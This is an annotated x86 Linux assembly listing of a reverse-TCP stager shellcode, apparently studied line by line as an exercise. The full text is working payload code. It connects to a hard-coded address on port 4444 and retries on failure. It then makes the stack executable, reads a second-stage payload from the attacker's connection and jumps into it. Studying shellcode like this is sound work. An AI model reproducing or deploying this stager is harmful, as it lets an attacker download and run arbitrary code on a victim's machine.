global _start

section .text

_start:

push byte 0xa               ; push to the stack 0x0A
pop esi                     ; pop 0x0A to ESI, ESI is now 0x0000000A. 
xor ebx,ebx                 ; Empty EBX
mul ebx                     ; MULing with zero produces zero in EAX and EDX

; socket(2)
push ebx                    ; Push a zero to the stack
inc ebx                     ; set eax to 0x01
push ebx                    ; push 0x01 in eax to the stack
push byte 0x2               ; push 0x00000002 to the stack
mov al,0x66                 ; move the syscall id for socketcall to eax
mov ecx,esp                 ; move esp (now a pointer to the socket(2) argument array) to ecx
int 0x80                    ; make syscall

; connect(2)
xchg eax,edi                ; save file handle returned by socket(2)
pop ebx                     ; pop 0x02 from the stack into EBX. (socketcall id for connect)

; build sockaddr struct
push dword 0x50110ac        ; push destination IP to the stack in network byte order
push dword 0x5c110002       ; push destination port and protocol family in one go.
mov ecx,esp                 ; save the pointer to this struct in ECX

; continuing connect(2)
push byte 0x66              ; use the push pop method to set EAX to the syscall id for socketcall. 
pop eax
push eax                    ; push 0x66 to the stack
push ecx                    ; push the pointer to the sockaddr struct to the stack
push edi                    ; push file handle to the stack
mov ecx,esp                 ; save the pointer to connect(2)'s arguments in ECX
inc ebx                     ; set socketcall ID for connect(2)
int 0x80                    ; make syscall

test eax,eax                ; connect should return zero if successful or a negative ERRNO if failed. 
                            ; TESTing with itself will set the sign flag in a way that lets us jns on errno.
jns 0x48                    ; If we did not get an ERRNO jump to shellcode +72 (mov dl,0x7)
dec esi                     ; If we did get an errno, dec esi (ESI is being used as a retry counter, I think)
jz 0x6f                     ; If ESI is zero JMP to shellcode +111 (the start of an exit(2)  syscall)

; nanosleep(2), retry if the connect failed. 
push dword 0xa2             ; If not, push 0xA2 to the stack
pop eax                     ; and POP it to EAX. This is the syscall ID for nanosleep(2)
push byte 0x0               ; push a timespec structure, first nanoseconds (0 ns)
push byte 0x5               ; second push seconds (5 seconds) to the stack.
mov ebx,esp                 ; copy to ebx the pointer to this structure
xor ecx,ecx                 ; set rem to 0 (a pointer to where the remaining time is written if interrupted)
int 0x80                    ; make nanosleep(2) syscall
test eax,eax                ; check if an ERRNO was returned
jns 0x3                     ; if not, JMP to shellcode +3, the XOR EBX, EBX at the start of the shellcode
jmp short 0x6f              ; if there was an ERRNO, JMP to the exit(2) call at shellcode +111

; mprotect(2), set stack to be readable, writable, and execitable. 
mov dl,0x7                  ; mprotect prot (0x07 is read, write, and exec)
mov ecx,0x1000              ; size of memory to set protections on
mov ebx,esp                 ; move the stack pointer to ebx (its altering the stack's memory)
shr ebx,byte 0xc            ; shift EBX to the right 12 bits  
shl ebx,byte 0xc            ; shift EBX to the left 12 bits (these two istr. zero 12 bits to the right
mov al,0x7d                 ; set EAX to the syscall ID of mprotect(2) (EAX was zered by nanosleep(2))
int 0x80                    ; syscall

test eax,eax                ; was a errno returned by mprotect(2)
js 0x6f                     ; if so, jmp to exit call

; read(2)
pop ebx                     ; if no errno, pop the fd for the connection from the stack
mov ecx,esp                 ; copy the stack pointer to ecx as the memory to write into
cdq                         ; write bit 31 of eax into all bits of edx, this zeros edx in this instance
mov dh,0xc                  ; read 3072 bytes
mov al,0x3                  ; set read syscall it
int 0x80                    ; interrupt

; Pass execution to second stage
test eax,eax                ; did read return errno?
js 0x6f                     ; if yes, gracefully exit 
jmp ecx                     ; if not, jmp to ecx

; exit(2)
mov eax,0x1                 ; exit(2) 
mov ebx,0x1                 ; exit with False
int 0x80                    ; fire syscall 
